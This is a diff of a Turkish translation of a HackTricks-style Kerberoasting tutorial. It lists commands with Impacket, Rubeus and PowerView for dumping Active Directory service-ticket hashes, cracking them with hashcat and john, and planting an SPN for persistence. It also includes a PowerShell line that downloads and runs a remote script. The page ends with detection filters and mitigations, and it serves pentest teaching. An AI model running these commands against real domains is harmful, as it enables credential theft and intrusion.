@@ -3,43 +3,44 @@
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) kullanarak dünyanın en gelişmiş topluluk araçlarıyla desteklenen **otomatik iş akışları** oluşturun ve otomatikleştirin.\
+Dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **iş akışlarını** kolayca oluşturmak ve **otomatikleştirmek** için [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) kullanın.\
 Bugün Erişim Alın:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
 
+{% hint style="success" %}
+AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Sıfırdan kahramana kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-HackTricks'ı desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
-* **Hacking püf noktalarınızı göndererek HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR'lar gönderin.
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
+* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
+{% endhint %}
 
 ## Kerberoast
 
-Kerberoast, özellikle **Active Directory (AD)** altında **kullanıcı hesapları** ile çalışan hizmetlere ait **TGS biletlerinin** elde edilmesine odaklanır, **bilgisayar hesaplarını** hariç tutar. Bu biletlerin şifrelemesi, **kullanıcı şifrelerinden** kaynaklanan anahtarlar kullanır ve **çevrimdışı kimlik bilgilerinin kırılma** olasılığı sağlar. Bir hizmetin bir kullanıcı hesabı olarak kullanılması, boş olmayan bir **"ServicePrincipalName"** özelliği ile belirtilir.
+Kerberoasting, **Active Directory (AD)** altında **kullanıcı hesapları** ile çalışan hizmetlere ait **TGS biletlerinin** edinilmesine odaklanır; **bilgisayar hesapları** hariçtir. Bu biletlerin şifrelemesi, **kullanıcı şifrelerinden** kaynaklanan anahtarları kullanır ve bu da **çevrimdışı kimlik bilgisi kırma** olasılığını sağlar. Bir hizmetin kullanıcı hesabı olarak kullanıldığını gösteren, boş olmayan bir **"ServicePrincipalName"** özelliği vardır.
 
-**Kerberoast**'i yürütmek için **TGS biletleri** isteyebilen bir etki alanı hesabı gereklidir; ancak, bu işlem **özel ayrıcalıklar** gerektirmez, bu nedenle **geçerli etki alanı kimlik bilgilerine** sahip herkes tarafından erişilebilir.
+**Kerberoasting** gerçekleştirmek için, **TGS biletleri** talep edebilen bir alan hesabı gereklidir; ancak bu süreç **özel ayrıcalıklar** talep etmez, bu da **geçerli alan kimlik bilgilerine** sahip herkesin erişimine açık olduğu anlamına gelir.
 
 ### Ana Noktalar:
 
-* **Kerberoast**, **AD** içindeki **kullanıcı hesabı hizmetleri** için **TGS biletlerini** hedefler.
-* **Kullanıcı şifrelerinden** gelen anahtarlarla şifrelenen biletler **çevrimdışı kırılabilir**.
+* **Kerberoasting**, **AD** içindeki **kullanıcı-hesap hizmetleri** için **TGS biletlerini** hedef alır.
+* **Kullanıcı şifrelerinden** gelen anahtarlarla şifrelenmiş biletler **çevrimdışı** kırılabilir.
 * Bir hizmet, boş olmayan bir **ServicePrincipalName** ile tanımlanır.
-* Sadece **geçerli etki alanı kimlik bilgileri** gereklidir, **özel ayrıcalıklar** gerekmez.
+* **Özel ayrıcalıklar** gerekmez, sadece **geçerli alan kimlik bilgileri** yeterlidir.
 
 ### **Saldırı**
 
 {% hint style="warning" %}
-**Kerberoast araçları** genellikle saldırıyı gerçekleştirirken ve TGS-REQ isteklerini başlatırken **`RC4 şifrelemesi`** istemektedir. Bu, **RC4'ün** diğer şifreleme algoritmaları olan AES-128 ve AES-256'dan **daha zayıf** olması ve Hashcat gibi araçlarla **çevrimdışı kırılmasının** daha kolay olması nedeniyledir.\
-RC4 (tip 23) hash'leri **`$krb5tgs$23$*`** ile başlarken, AES-256 (tip 18) **`$krb5tgs$18$*`** ile başlar.
+**Kerberoasting araçları**, saldırıyı gerçekleştirirken ve TGS-REQ isteklerini başlatırken genellikle **`RC4 şifrelemesi`** talep eder. Bunun nedeni, **RC4'ün** [**daha zayıf**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) olması ve Hashcat gibi araçlarla çevrimdışı kırılmasının, AES-128 ve AES-256 gibi diğer şifreleme algoritmalarına göre daha kolay olmasıdır.\
+RC4 (tip 23) hash'leri **`$krb5tgs$23$*`** ile başlarken, AES-256 (tip 18) **`$krb5tgs$18$*`** ile başlar.`
 {% endhint %}
 
 #### **Linux**
@@ -53,21 +54,21 @@ GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERN
 kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
 kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
 ```
-Çok özellikli araçlar, kerberoast edilebilir kullanıcıların bir dökümünü içerir:
+Çoklu özelliklere sahip araçlar, kerberoastable kullanıcıların bir dökümünü içerir:
 ```bash
 # ADenum: https://github.com/SecuProject/ADenum
 adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
 ```
 #### Windows
 
-* **Kerberoast edilebilir kullanıcıları listeleyin**
+* **Kerberoastable kullanıcıları listele**
 ```powershell
 # Get Kerberoastable users
 setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
 Get-NetUser -SPN | select serviceprincipalname #Powerview
 .\Rubeus.exe kerberoast /stats
 ```
-* **Teknik 1: TGS iste ve bellekten dök**
+* **Teknik 1: TGS isteğinde bulunun ve bellekten dökün**
 ```powershell
 #Get TGS in memory from a single user
 Add-Type -AssemblyName System.IdentityModel
@@ -104,63 +105,63 @@ iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com
 Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
 ```
 {% hint style="warning" %}
-Bir TGS istendiğinde, Windows etkinliği `4769 - Bir Kerberos hizmet bileti istendi` oluşturulur.
+Bir TGS talep edildiğinde, Windows olayı `4769 - Bir Kerberos hizmet bileti talep edildi` oluşturulur.
 {% endhint %}
 
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) kullanarak dünyanın en gelişmiş topluluk araçlarıyla desteklenen **otomatik iş akışları** oluşturun ve kolayca çalıştırın.\
-Bugün Erişim Edinin:
+Dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **iş akışlarını** kolayca oluşturmak ve **otomatikleştirmek** için [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) kullanın.\
+Bugün Erişim Alın:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
 
-### Kırılma
+### Kırma
 ```bash
 john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
-### Kalıcılık
+### Süreklilik
 
-Eğer bir kullanıcı üzerinde yeterli **izinlere** sahipseniz, onu **kerberoastable** hale getirebilirsiniz:
+Eğer bir kullanıcı üzerinde **yeterli izinleriniz** varsa, onu **kerberoastable** hale getirebilirsiniz:
 ```bash
 Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
 ```
-Kerberoast saldırıları için yararlı **araçları** burada bulabilirsiniz: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
+You can find useful **tools** for **kerberoast** attacks here: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
 
-Eğer Linux'tan bu **hata** ile karşılaşırsanız: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** bu, yerel saatinizden kaynaklanır, ana bilgisayarı DC ile senkronize etmeniz gerekir. Birkaç seçenek bulunmaktadır:
+If you find this **error** from Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** bu, yerel saatinizle ilgilidir, hostu DC ile senkronize etmeniz gerekir. Birkaç seçenek var:
 
-* `ntpdate <DC'nin IP'si>` - Ubuntu 16.04'ten itibaren kullanım dışı
+* `ntpdate <DC'nin IP'si>` - Ubuntu 16.04 itibarıyla kullanımdan kaldırılmıştır.
 * `rdate -n <DC'nin IP'si>`
 
-### Hafifletme
+### Mitigation
 
-Kerberoasting, sömürülebilirse yüksek derecede gizlilikle gerçekleştirilebilir. Bu faaliyeti tespit etmek için dikkat edilmesi gereken nokta, bir Kerberos bileti istendiğini belirten **Güvenlik Olay Kimliği 4769**'dur. Ancak, bu olayın sıklığı nedeniyle şüpheli faaliyetleri izole etmek için belirli filtreler uygulanmalıdır:
+Kerberoasting, eğer istismar edilebiliyorsa, yüksek bir gizlilik derecesi ile gerçekleştirilebilir. Bu etkinliği tespit etmek için, bir Kerberos biletinin talep edildiğini gösteren **Security Event ID 4769**'a dikkat edilmelidir. Ancak, bu olayın yüksek sıklığı nedeniyle, şüpheli etkinlikleri izole etmek için belirli filtreler uygulanmalıdır:
 
-* Hizmet adı **krbtgt** olmamalıdır, çünkü bu normal bir istektir.
-* **$** ile biten hizmet adları, servisler için kullanılan makine hesaplarını içermemek için hariç tutulmalıdır.
-* Makinelerden gelen istekler, **makine@domain** biçimindeki hesap adlarını hariç tutarak filtrelenmelidir.
-* Yalnızca başarılı bilet istekleri dikkate alınmalıdır, **'0x0'** hata kodu ile belirlenenler.
-* **En önemlisi**, bilet şifreleme türü **0x17** olmalıdır, bu genellikle Kerberoast saldırılarında kullanılır.
+* Hizmet adı **krbtgt** olmamalıdır, çünkü bu normal bir taleptir.
+* **$** ile biten hizmet adları, hizmetler için kullanılan makine hesaplarını dahil etmemek için hariç tutulmalıdır.
+* Makinalardan gelen talepler, **machine@domain** formatında olan hesap adları hariç tutularak filtrelenmelidir.
+* Sadece başarılı bilet talepleri dikkate alınmalıdır, bunlar **'0x0'** hata kodu ile tanımlanır.
+* **En önemlisi**, bilet şifreleme türü **0x17** olmalıdır, bu genellikle Kerberoasting saldırılarında kullanılır.
 ```bash
 Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
 ```
-Kerberoasting risklerini azaltmak için şunları yapabilirsiniz:
+Kerberoasting riskini azaltmak için:
 
-- **Hizmet Hesabı Şifrelerinin tahmin edilmesi zor olacak şekilde** yapılmasını sağlayın, en az **25 karakter** uzunluğunu önerin.
-- **Yönetilen Hizmet Hesapları** kullanın, otomatik şifre değişiklikleri ve yetkilendirilmiş Hizmet Başlığı Adı (SPN) Yönetimi gibi faydalar sunarak bu tür saldırılara karşı güvenliği artırın.
+* **Hizmet Hesabı Parolalarının tahmin edilmesi zor olmasını** sağlayın, **25 karakterden** daha uzun bir uzunluk önerilmektedir.
+* **Yönetilen Hizmet Hesaplarını** kullanın; bu, **otomatik parola değişiklikleri** ve **devredilmiş Hizmet Prensip Adı (SPN) Yönetimi** gibi avantajlar sunarak bu tür saldırılara karşı güvenliği artırır.
 
-Bu önlemleri uygulayarak, kuruluşlar Kerberoasting ile ilişkilendirilen riski önemli ölçüde azaltabilirler.
+Bu önlemleri uygulayarak, kuruluşlar Kerberoasting ile ilişkili riski önemli ölçüde azaltabilir.
 
-## Alan hesabı olmadan Kerberoast
+## Kerberoast w/o domain account
 
-**Eylül 2022**'de, araştırmacı Charlie Clark adlı bir kişi tarafından bir sistem üzerinde istismar etmek için yeni bir yol [exploit.ph](https://exploit.ph/) platformu aracılığıyla paylaşıldı. Bu yöntem, herhangi bir Active Directory hesabı üzerinde kontrol gerektirmeyen **KRB\_AS\_REQ** isteği aracılığıyla **Hizmet Biletleri (ST)** elde etmeyi sağlar. Temelde, bir pre-authentication gerektirmeyen bir şekilde bir prensip kurulmuşsa - siber güvenlik alanında bilinen bir senaryo olan **AS-REP Roasting saldırısı** ile benzer bir senaryo - bu özellik isteğin işlenmesini manipüle etmek için kullanılabilir. Özellikle, isteğin gövdesindeki **sname** özniteliğini değiştirerek, sistem standart şifrelenmiş Bilet Verme Bileti (TGT) yerine bir **ST** çıkarmaya aldanır.
+**Eylül 2022**'de, Charlie Clark adında bir araştırmacı tarafından bir sistemin istismar edilmesi için yeni bir yol ortaya çıkarıldı ve bu, [exploit.ph](https://exploit.ph/) platformu aracılığıyla paylaşıldı. Bu yöntem, herhangi bir Active Directory hesabı üzerinde kontrol gerektirmeden **KRB\_AS\_REQ** isteği aracılığıyla **Hizmet Biletleri (ST)** edinilmesine olanak tanır. Temelde, bir prensip, ön kimlik doğrulama gerektirmeyecek şekilde ayarlandığında—siber güvenlik alanında **AS-REP Roasting saldırısı** olarak bilinen bir senaryoya benzer—bu özellik, istek sürecini manipüle etmek için kullanılabilir. Özellikle, isteğin gövdesindeki **sname** niteliğini değiştirerek, sistemin standart şifreli Bilet Verme Bileti (TGT) yerine bir **ST** vermesi sağlanır.
 
-Teknik ayrıntılar bu makalede tam olarak açıklanmıştır: [Semperis blog yazısı](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
+Teknik, bu makalede tam olarak açıklanmaktadır: [Semperis blog yazısı](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
 
 {% hint style="warning" %}
-Bu teknikle LDAP sorgulamak için geçerli bir hesabımız olmadığından, bir kullanıcı listesi sağlamanız gerekmektedir.
+Bu teknikle LDAP'ı sorgulamak için geçerli bir hesabımız olmadığından, bir kullanıcı listesi sağlamalısınız.
 {% endhint %}
 
 #### Linux
@@ -171,7 +172,7 @@ GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "d
 ```
 #### Windows
 
-* [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139):
+* [GhostPack/Rubeus PR #139'dan](https://github.com/GhostPack/Rubeus/pull/139):
 ```bash
 Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
 ```
@@ -181,24 +182,25 @@ Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"d
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
 
+{% hint style="success" %}
+AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Sıfırdan kahraman olacak şekilde AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-HackTricks'ı desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
-* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da **takip edin**.
-* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter**'da **bizi takip edin** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) kullanarak dünyanın **en gelişmiş topluluk araçları** tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
+[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) kullanarak dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **iş akışlarını** kolayca oluşturun ve **otomatikleştirin**.\
 Bugün Erişim Alın:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
